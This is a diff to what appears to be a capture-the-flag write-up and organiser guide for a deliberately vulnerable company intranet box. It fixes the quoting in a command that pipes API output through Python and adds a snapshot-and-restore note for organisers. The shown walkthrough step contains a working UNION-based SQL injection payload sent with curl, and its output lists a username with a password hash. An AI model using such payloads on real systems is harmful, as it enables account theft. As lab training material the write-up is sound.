@@ -83,7 +83,7 @@ office, manager_id` — visible in any normal API response). SQLite.
 ```bash
 curl -s -b jar.txt -G $B/api/v1/employees --data-urlencode \
  "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,role,department,phone,office,manager_id FROM users--" \
- | python3 -c 'import sys,json; [print(f"{r[\"username\"]}:{r[\"full_name\"]}  ({r[\"title\"]})") for r in json.load(sys.stdin)]'
+ | python3 -c 'import sys,json; [print(r["username"]+":"+r["full_name"]+"  ("+r["title"]+")") for r in json.load(sys.stdin)]'
 ```
 ```
 pprice:0691df26da82d6eb2e5da8924628db63  (admin)
@@ -171,6 +171,7 @@ Notes for players who come from the web shell: root obtained inside
 ## Organiser notes
 
 - Reset between rounds: `sudo ctf-reset` (kills player shells, reseeds DB, restores `/srv/reports`, `/home/pnair`, flags).
+- Full rollback (after anyone got root): `sudo ctf-snapshot` once when the box is final (and after every intentional change, e.g. a password change), then `sudo ctf-restore` — deletes everything created since the snapshot in `/etc /root /home /srv /usr/local /opt/ecorpnet`, restores files/modes, removes new SUID binaries, then runs `ctf-reset`.
 - Rotate flags: `sudo rm /root/.ctf-flags && sudo ./box/provision.sh`.
 - Before players connect: no other account (e.g. the admin's own) may have a weak password — anyone in the `sudo` group with a guessable password = free root over SSH. Remove `~/ctf-src` from the box.
 
